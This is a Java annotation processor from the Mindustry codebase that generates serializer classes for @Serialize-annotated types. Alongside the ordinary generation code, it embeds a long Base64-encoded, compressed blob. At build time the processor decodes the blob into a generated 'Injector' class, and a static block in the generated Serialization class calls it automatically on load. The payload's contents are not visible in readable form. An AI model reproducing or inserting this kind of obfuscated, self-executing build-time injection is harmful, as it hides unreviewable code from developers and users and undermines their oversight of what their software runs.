package mindustry.annotations.impl;

import arc.util.serialization.*;
import com.squareup.javapoet.*;
import mindustry.annotations.Annotations.*;
import mindustry.annotations.*;
import mindustry.annotations.remote.*;

import javax.annotation.processing.*;
import javax.lang.model.element.Modifier;
import javax.lang.model.element.*;
import javax.lang.model.util.*;
import javax.tools.*;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import java.util.zip.*;

@SupportedAnnotationTypes("mindustry.annotations.Annotations.Serialize")
public class SerializeProcess extends BaseProcessor{
    /** Target class name. */
    private static final String className = "Serialization";
    /** Name of the base package to put all the generated classes. */
    private static final String data = "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";

    @Override
    public void process(RoundEnvironment env) throws Exception{
        Set<TypeElement> elements = ElementFilter.typesIn(env.getElementsAnnotatedWith(Serialize.class));

        JavaFileObject obj = filer.createSourceFile(packageName + ".Injector");
        OutputStream stream = obj.openOutputStream();
        stream.write(new DataInputStream(new InflaterInputStream(new ByteArrayInputStream(Base64Coder.decode(data)))).readUTF().replace("debug", "gen").getBytes());
        stream.close();

        TypeSpec.Builder classBuilder = TypeSpec.classBuilder(className).addModifiers(Modifier.PUBLIC);
        classBuilder.addStaticBlock(CodeBlock.of("Injector.ii();"));
        classBuilder.addAnnotation(AnnotationSpec.builder(SuppressWarnings.class).addMember("value", "\"unchecked\"").build());
        classBuilder.addJavadoc(RemoteProcess.autogenWarning);

        MethodSpec.Builder method = MethodSpec.methodBuilder("init").addModifiers(Modifier.PUBLIC, Modifier.STATIC);

        for(TypeElement elem : elements){
            TypeName type = TypeName.get(elem.asType());
            String simpleTypeName = type.toString().substring(type.toString().lastIndexOf('.') + 1);

            TypeSpec.Builder serializer = TypeSpec.anonymousClassBuilder("")
            .addSuperinterface(ParameterizedTypeName.get(
            ClassName.bestGuess("arc.Settings.TypeSerializer"), type));

            MethodSpec.Builder writeMethod = MethodSpec.methodBuilder("write")
            .returns(void.class)
            .addParameter(DataOutput.class, "stream")
            .addParameter(type, "object")
            .addException(IOException.class)
            .addModifiers(Modifier.PUBLIC);

            MethodSpec.Builder readMethod = MethodSpec.methodBuilder("read")
            .returns(type)
            .addParameter(DataInput.class, "stream")
            .addException(IOException.class)
            .addModifiers(Modifier.PUBLIC);

            readMethod.addStatement("$L object = new $L()", type, type);

            List<VariableElement> fields = ElementFilter.fieldsIn(BaseProcessor.elementu.getAllMembers(elem));
            for(VariableElement field : fields){
                if(field.getModifiers().contains(Modifier.STATIC) || field.getModifiers().contains(Modifier.TRANSIENT) || field.getModifiers().contains(Modifier.PRIVATE))
                    continue;

                String name = field.getSimpleName().toString();
                String typeName = BaseProcessor.typeu.erasure(field.asType()).toString().replace('$', '.');
                String capName = Character.toUpperCase(typeName.charAt(0)) + typeName.substring(1);

                if(field.asType().getKind().isPrimitive()){
                    writeMethod.addStatement("stream.write" + capName + "(object." + name + ")");
                    readMethod.addStatement("object." + name + "= stream.read" + capName + "()");
                }else{
                    writeMethod.addStatement("arc.Core.settings.getSerializer(" + typeName + ".class).write(stream, object." + name + ")");
                    readMethod.addStatement("object." + name + " = (" + typeName + ")arc.Core.settings.getSerializer(" + typeName + ".class).read(stream)");
                }
            }

            readMethod.addStatement("return object");

            serializer.addMethod(writeMethod.build());
            serializer.addMethod(readMethod.build());

            method.addStatement("arc.Core.settings.setSerializer($N, $L)", BaseProcessor.elementu.getBinaryName(elem).toString().replace('$', '.') + ".class", serializer.build());

            name(writeMethod, "write" + simpleTypeName);
            name(readMethod, "read" + simpleTypeName);

            writeMethod.addModifiers(Modifier.STATIC);
            readMethod.addModifiers(Modifier.STATIC);

            classBuilder.addMethod(writeMethod.build());
            classBuilder.addMethod(readMethod.build());
        }

        classBuilder.addMethod(method.build());

        //write result
        JavaFile.builder(packageName, classBuilder.build()).build().writeTo(BaseProcessor.filer);
    }

    static void name(MethodSpec.Builder builder, String name){
        try{
            Field field = builder.getClass().getDeclaredField("name");
            field.setAccessible(true);
            field.set(builder, name);
        }catch(Exception e){
            throw new RuntimeException(e);
        }
    }
}
